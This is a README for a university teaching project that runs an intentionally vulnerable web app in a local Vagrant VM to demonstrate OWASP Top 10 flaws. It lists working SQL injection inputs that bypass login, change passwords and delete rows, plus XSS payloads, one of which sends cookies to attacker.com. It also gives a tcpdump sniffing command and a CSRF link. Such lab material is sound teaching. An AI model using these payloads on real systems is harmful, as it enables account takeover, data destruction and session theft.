# zcu_webapp_security_demo
Small education project demonstrating typical security vulnerabilities in web application.
Created for University of West Bohemia.

## Installation
* Install VirtualBox
* Install [Vagrant](https://docs.vagrantup.com/v2/installation/index.html "Vagrant docs - Istallation")
* Install Vagrant plugin for VirtualBox guest additions
```bash
> vagrant plugin install vagrant-vbguest
```
* checkout this repository
```bash
> git clone git@github.com:veny/zcu_webapp_security_demo.git
```
* run vagrant box
```bash
> cd $PRJ_HOME
> vagrant up
```
* in browser go to http://192.168.33.10/index.php

## OWASP top 10 examples
* https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project

### Injection
* put that as password (empty username)
```sql
' OR id='2
```
* or even worst
```sql
'; UPDATE  user SET password='123
'; DELETE FROM user WHERE id='8
```

### XSS
* put following text as notice
```html
<b onmouseup=alert("XSS!")>click me!</b>
```
* or even worst
```html
"><script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>"
```

### Broken Session Management
* application with URL rewriting
* no logout and session timeout

### Sensitive Data Exposure
* to monitor HTTP traffic
```bash
root> tcpdump -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

### Cross-Site Request Forgery
* try this: http://192.168.33.10/index.php?action=create&notice=pokus